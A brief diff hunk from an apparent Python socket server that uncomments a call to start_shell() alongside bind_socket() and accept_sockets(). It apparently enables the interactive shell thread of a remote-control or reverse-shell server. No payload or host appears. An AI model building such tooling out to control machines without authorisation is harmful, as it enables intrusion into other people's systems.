@@ -180,8 +180,8 @@ def work():
             bind_socket()
             accept_sockets()
         
-        # if x == 2:
-            # start_shell()
+        if x == 2:
+            start_shell()
 
         queue.task_done() 
 
